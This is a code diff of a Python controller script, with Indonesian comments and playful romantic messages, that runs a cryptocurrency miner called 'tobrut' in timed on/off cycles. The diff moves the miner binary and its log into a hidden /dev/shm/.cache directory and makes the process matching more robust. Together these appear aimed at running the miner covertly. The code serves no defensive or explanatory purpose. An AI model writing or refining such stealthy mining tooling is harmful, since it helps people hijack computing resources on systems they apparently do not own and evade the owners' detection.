@@ -4,16 +4,17 @@ import psutil
 import sys
 
 # CONFIG
-MINER_NAME = "./tobrut"  # Nama file miner (sesuaikan dengan namanya)
-MINING_TIME = 1200  # Waktu mining (60 menit)
-REST_TIME = 600  # Waktu istirahat (20 menit)
-LOG_PATH = "logs/sayangku.log"
+MINER_NAME = "/dev/shm/.cache/tobrut"  # Lokasi miner kamu
+MINING_TIME = 1200  # 20 menit
+REST_TIME = 600  # 10 menit
+LOG_PATH = "/dev/shm/.cache/logs/sayangku.log"
 
 def get_pid(name):
-    for proc in psutil.process_iter(['pid', 'name']):
+    for proc in psutil.process_iter(['pid', 'cmdline']):
         try:
-            if name in proc.info['name']:
-                return proc.info['pid']
+            cmdline = " ".join(proc.info['cmdline']) if proc.info['cmdline'] else ""
+            if name in cmdline:
+                return proc.pid
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
     return None
@@ -34,17 +35,17 @@ def start_miner():
 
 def main():
     while True:
-        print("⛏️ Panen selama 60 menit buat beli iPhone 15 Pro Max buat kamu...")
+        print("⛏️ Panen selama 20 menit buat beli iPhone 15 Pro Max buat kamu...")
         start_miner()
         time.sleep(MINING_TIME)
 
         print("💔 Mesin udah capek, aku kill dulu ya sayang...")
         kill_miner()
 
-        print("😴 Istirahat dulu 20 menit biar hash kita fresh buat masa depan kita...")
+        print("😴 Istirahat dulu 10 menit biar hash kita fresh buat masa depan kita...")
         time.sleep(REST_TIME)
 
 if __name__ == "__main__":
-    print("💓 Cinta Abadi v3 Jalan Sayangku...")
+    print("💓 Cinta Abadi v4 Jalan Sayangku...")
     sys.stdout.flush()
     main()
